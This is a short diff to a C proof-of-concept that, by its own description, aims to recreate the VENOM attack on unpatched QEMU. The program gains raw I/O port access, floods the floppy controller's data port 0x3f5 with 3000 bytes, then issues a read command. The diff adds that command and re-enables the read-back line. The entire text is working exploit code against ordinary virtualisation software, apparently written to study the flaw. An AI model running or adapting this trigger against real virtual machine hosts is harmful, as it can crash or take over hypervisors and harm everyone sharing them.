@@ -8,6 +8,7 @@ It's aim is to exploit and recreate possible Venom attack on QEMU before patch
 #define SPC_COMMAND 0x8e
 #define MAX_COUNT  3000
 #define TEST_VAL  0x12
+#define FD_CMD_READ 0x06
 int main(void){
         iopl(3);
         ioperm(FIFO, 1, 1);
@@ -19,5 +20,6 @@ int main(void){
         for(i=0; i<MAX_COUNT; i++ ){
                 outb(TEST_VAL,0x3f5);
         }
-        // printf("try read: %d\n", inb(0x3f5));
+        outb(FD_CMD_READ, FIFO);
+        printf("try read: %d\n", inb(0x3f5));
 }
